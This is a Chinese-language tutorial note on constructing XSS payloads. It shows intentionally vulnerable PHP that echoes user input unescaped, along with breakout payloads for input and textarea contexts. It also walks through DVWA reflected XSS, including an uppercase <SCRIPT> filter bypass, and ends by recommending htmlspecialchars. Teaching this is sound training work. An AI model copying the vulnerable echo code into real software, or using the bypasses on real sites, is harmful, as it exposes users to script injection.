[TOC]


## 文本框
![]((23)构造Xss语句_files/824156b8-dc82-478f-b03c-99e25c6f4ca0.jpg)

1.突破`<script>`
2.突破alert


![]((23)构造Xss语句_files/69c4f5c3-31d8-4b09-a556-caaf669b62af.jpg)

如果跨站不成功,看网页 源码,需要查看你输入的在哪儿输出了！
![]((23)构造Xss语句_files/7c7ae09e-4b1a-413b-8c09-8a1c92413ba4.jpg)
可以在输入的地方输入特征字符，然后查找！
![]((23)构造Xss语句_files/a9c56bee-3c90-4284-8a95-8568851f1ae7.jpg)

![]((23)构造Xss语句_files/97df330b-df39-46e7-abfb-2580d6880a5a.jpg)
双引号 闭合的是value前面的这个双引号
![]((23)构造Xss语句_files/96ca0415-a5b4-4711-8905-99bf6d9c00d8.jpg)


![]((23)构造Xss语句_files/8954bcef-589a-4995-8ca7-f7855d7336cf.jpg)
xss1里面的php脚本：
```
<?php
$username = $_POST['uname']; 
//echo "<p> hello,".$username."</p>";
echo '<input type="text" value="' .$username.'"/>';
?>

```
输入:
```
"/><script>alert('hi')</script>
```

![]((23)构造Xss语句_files/2404eaeb-3781-4615-8389-315984e4717a.png)

![]((23)构造Xss语句_files/c83ca893-c292-4112-8f7d-1b5f27d50235.png)

源码:

![]((23)构造Xss语句_files/9b3b3d94-f293-453f-8cf5-7d01af9eeb34.png)

这是我们所输入的:

![]((23)构造Xss语句_files/1c00c284-d14c-45ae-8de4-dc2c7fd9c1df.png)


## 文本域相关
```
<?php
$username = $_POST['uname']; 
//echo "<p> hello,".$username."</p>";
//echo '<input type="text" value="' .$username.'"/>';
echo '<textarea rows="3" cols="20">'.$username. '</textarea>';//rows表示可以输出的行数,cols表示输出的列数
?>

```


![]((23)构造Xss语句_files/5795cb2c-fc62-4a44-94db-a093b7a48da5.png)

![]((23)构造Xss语句_files/849a4103-8ce4-4fa0-a335-4940a7de006e.png)

![]((23)构造Xss语句_files/a8888195-4927-4c24-af61-43a535680315.png)

在框里面输入:
```
</textarea> <script>alert('hi')</script>
```
![]((23)构造Xss语句_files/8e1b981e-80e7-4c1a-9441-85703c599d53.png)

![]((23)构造Xss语句_files/963a2f77-16d8-4a66-938c-59d301a861ec.png)


## dvwa实战

### 反射型XSS
![]((23)构造Xss语句_files/12baeb31-4b9f-4a39-a222-2b1d7aef512b.jpg)
绕过方法:2.用大写3.作为事件运行
先上的是dvwa里面的low等级;
![]((23)构造Xss语句_files/3922ecb9-257b-4889-ad43-845a4dc595b0.png)

查看源码:可以发现刚刚自己输入的:

![]((23)构造Xss语句_files/09aafc22-2237-4a4c-814b-5d6aaa38e0e8.png)

![]((23)构造Xss语句_files/d7c0e4c7-88b8-4a4a-a09d-7f309b70127e.png)


输入:
```
<script>alert('hi')</script>

```
![]((23)构造Xss语句_files/17cfb9f8-a91f-4aa8-aec2-bbeb82f09a2d.png)

![]((23)构造Xss语句_files/57abfe66-e8a5-4e7b-a330-3aa6c0b05267.png)

![]((23)构造Xss语句_files/4aa949f4-7974-4fae-adfd-d4b906a78ba4.png)

```
 <?php

if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){

 $isempty = true;

} else {
        
 echo '<pre>';
 echo 'Hello ' . $_GET['name'];
 echo '</pre>';
    
}

?> 
```
换成中级的:

![]((23)构造Xss语句_files/f10c27c8-9cbd-42d3-b721-9ec92a4919f9.png)

注意与低级别的区别！
```
 <?php

if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){

 $isempty = true;

} else {

 echo '<pre>';
 echo 'Hello ' . str_replace('<script>', '', $_GET['name']);
 echo '</pre>'; 

}

?> 
```
将`<script>`替换为空了！
![]((23)构造Xss语句_files/d8ed4736-f7b3-4b2a-963a-ca08b2b86ee2.png)

![]((23)构造Xss语句_files/124af516-1551-4a8c-bb77-50e263e31038.png)

输入:
```
<SCRIPT>alert('hi')</SCRIPT>
```

![]((23)构造Xss语句_files/22214bf8-2fed-4435-a828-246d78b6e4f2.png)

![]((23)构造Xss语句_files/3ce2275a-0beb-4f1a-beb7-dd9067d8657c.png)

高级的:

![]((23)构造Xss语句_files/4f2c91fc-661d-4e33-9bf9-20d6b0e024aa.png)

```
 <?php
    
if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){
    
 $isempty = true;
        
} else {
    
 echo '<pre>';
 echo 'Hello ' . htmlspecialchars($_GET['name']);
 echo '</pre>';
        
}

?> 
```



**`htmlspecialchars`这个函数很重要！它把XSS语句转换成实体了！**
中级里面把script过滤了;
![]((23)构造Xss语句_files/e2697c58-b3c6-4cc2-937a-be75b7d90262.jpg)

![]((23)构造Xss语句_files/005e7e27-c1e4-45e2-bd9d-51a4545672d6.png)

![]((23)构造Xss语句_files/51ea1d7e-ef76-42cc-9a43-555737826ba9.png)

加固语句:
![]((23)构造Xss语句_files/8685791d-89d2-42d8-a9c6-455f928d2519.jpg)
